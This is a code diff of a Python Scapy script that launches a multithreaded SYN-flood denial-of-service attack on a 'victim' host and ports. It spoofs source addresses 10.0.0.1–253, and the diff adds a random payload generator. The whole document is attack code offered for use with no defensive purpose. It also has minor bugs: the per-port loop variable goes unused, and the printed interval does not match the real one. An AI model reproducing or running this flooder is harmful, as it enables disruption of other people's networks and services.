@@ -1,22 +1,21 @@
 from scapy.all import *
 from threading import Thread
 import time
+import random
 
-# Args:
-# victimAddress (string, hostname or ip of target)
-# victimPorts (list, port numbers to target)
-def sendPackets(victimAddress, victimPorts):
-	for port in victimPorts:
+def sendPackets(victimAddress,victimPort):
+	for port in victimPort:
 		for i in range(1,254):
-			packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress, id=1111, ttl=99)/TCP(sport=RandShort(), dport=victimPort, seq=12345, ack=1000, window=1000, flags="S")/"wow look its a lot of random data hello victim"
-			print "Sending Packets in 0.1 second intervals for timeout of 4 sec"
-			ans,unans=srloop(packetSYN, inter=0.1, retry=2, timeout=4)
+			raw = str(createRandomString())
+			packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress,id=1111,ttl=99)/TCP(sport=RandShort(),dport=victimPort,seq=12345,ack=1000,window=1000,flags="S")/raw
+			print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
+			ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
 
-# Args:
-# victimAddress (string, hostname or ip of target)
-# victimPorts (list, port numbers to target)
-# numThreads (int, number of threads to run)
-def startDDOS(victimAddress, victimPorts, numThreads):
-	for i in range(numThreads):
-		thread = Thread(target=sendPackets,args=(victimAddress, victimPorts))
+def startDDOS(victimAddress,victimPort,numThreads):
+	for i in range(1,numThreads):
+		thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
 		thread.start()
+def createRandomString():
+	min = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+	max = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+	return random.randint(min,max)
